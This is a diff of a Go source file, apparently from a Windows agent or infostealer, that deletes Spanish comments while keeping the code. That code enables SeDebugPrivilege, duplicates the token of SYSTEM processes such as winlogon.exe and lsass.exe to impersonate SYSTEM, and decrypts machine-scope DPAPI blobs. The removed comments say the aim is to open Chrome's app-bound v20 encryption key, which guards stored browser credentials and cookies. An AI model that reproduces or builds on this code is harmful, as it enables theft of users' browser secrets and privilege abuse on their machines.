@@ -11,17 +11,8 @@ import (
 
 var procImpersonateLoggedOnUser = advapi32.NewProc("ImpersonateLoggedOnUser")
 
-// systemProcesses son los primeros procesos de los que se puede tomar un token
-// SYSTEM. winlogon va primero: existe en toda sesión interactiva y no es un
-// proceso protegido por defecto.
 var systemProcesses = []string{"winlogon.exe", "services.exe", "lsass.exe"}
 
-// impersonateSystem duplica el token de un proceso SYSTEM y lo pone como token
-// de impersonación del hilo actual. Devuelve la función que revierte.
-//
-// Es lo que hace falta para abrir la clave app-bound de Chrome (v20): el blob
-// exterior está protegido con DPAPI en ámbito de máquina y CryptUnprotectData
-// con CRYPTPROTECT_SYSTEM solo lo abre si el token que llama es SYSTEM.
 func impersonateSystem() (func(), error) {
 	_ = enablePrivilege("SeDebugPrivilege")
 
@@ -87,9 +78,6 @@ func impersonatePID(pid uint32) (func(), error) {
 	}, nil
 }
 
-// DPAPIUnprotectMachine abre un blob protegido en ámbito de máquina. Primero
-// lo intenta tal cual —si el agente ya corre como SYSTEM, sobra la
-// impersonación— y si no, toma prestado el token de un proceso SYSTEM.
 func DPAPIUnprotectMachine(data []byte) ([]byte, error) {
 	plain, err := DPAPIUnprotectSystem(data)
 	if err == nil {
